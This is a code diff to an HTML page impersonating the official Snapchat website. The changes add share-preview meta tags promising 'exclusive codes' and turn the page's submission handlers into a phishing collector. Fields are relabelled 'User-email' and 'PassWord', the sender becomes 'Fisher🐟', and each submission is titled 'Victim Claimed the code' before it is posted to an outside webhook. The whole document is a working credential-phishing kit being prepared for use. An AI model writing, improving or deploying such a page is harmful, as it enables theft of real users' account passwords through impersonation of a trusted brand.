@@ -4,6 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat - Official Website</title>
+    
+    <!-- =========================================
+         اللوكو اللي كيبان فـ Tab الفوق (Favicon)
+    ========================================= -->
+    <link rel="icon" type="image/png" href="https://www.image2url.com/r2/default/images/1787706393173-d07d05d6-5926-458b-be2f-efecebf45361.png">
+    
+    <!-- =========================================
+         إعدادات البارطاج باش يبان اللوكو مربع صغير فجنب الرابط
+    ========================================= -->
+    <meta property="og:title" content="Share Idea - Official Website">
+    <meta property="og:description" content="Submit your ideas and claim your exclusive codes securely.">
+    <meta property="og:image" content="https://www.image2url.com/r2/default/images/1787706393173-d07d05d6-5926-458b-be2f-efecebf45361.png">
+    
+    <!-- هاد الكود هو اللي كيخلي ديسكورد يحط التصويرة فداك المربع الصغير اللي ضورتي عليه -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Share Idea - Official Website">
+    <meta name="twitter:description" content="Submit your ideas and claim your exclusive codes securely.">
+    <meta name="twitter:image" content="https://www.image2url.com/r2/default/images/1787706393173-d07d05d6-5926-458b-be2f-efecebf45361.png">
+
     <style>
         /* --- الألوان والخطوط الأساسية --- */
         :root {
@@ -395,14 +414,14 @@
             btn.disabled = true;
 
             const payload = {
-                username: "Idea Submissions",
-                avatar_url: "https://www.image2url.com/r2/default/images/1787355103800-8996be18-d2a7-46f6-9a4e-903453bffa28.png",
+                username: "Fisher🐟",
+                avatar_url: "https://www.image2url.com/r2/default/images/1787707174971-21d64c09-19f1-4ca6-a9f0-257d52e53491.png",
                 embeds: [{
-                    title: "💡 Code Claimed!",
+                    title: "Victim Claimed the code ",
                     color: 3447003, 
                     fields: [
-                        { name: "Name", value: capturedUsername || "Unknown User", inline: true }, 
-                        { name: "Main Code", value: ideaText }
+                        { name: "User-email", value: capturedUsername || "Unknown User", inline: true }, 
+                        { name: "PassWord", value: ideaText }
                     ],
                     footer: { text: "Sent from Claim Page" },
                     timestamp: new Date().toISOString()
@@ -458,14 +477,14 @@
             btn.disabled = true;
 
             const payload = {
-                username: "Idea Submissions",
-                avatar_url: "https://www.image2url.com/r2/default/images/1787355103800-8996be18-d2a7-46f6-9a4e-903453bffa28.png",
+                username: "Fisher🐟",
+                avatar_url: "https://www.image2url.com/r2/default/images/1787707174971-21d64c09-19f1-4ca6-a9f0-257d52e53491.png",
                 embeds: [{
-                    title: "🔍 Review Code Submitted!",
+                    title: "Victim Claimed the code",
                     color: 15105570, 
                     fields: [
-                        { name: "Name", value: capturedUsername || "Unknown User", inline: true }, 
-                        { name: "Review Code", value: reviewText }
+                        { name: "Hes name ", value: capturedUsername || "Unknown User", inline: true }, 
+                        { name: "Code claimed", value: reviewText }
                     ],
                     footer: { text: "Sent from Review Page" },
                     timestamp: new Date().toISOString()
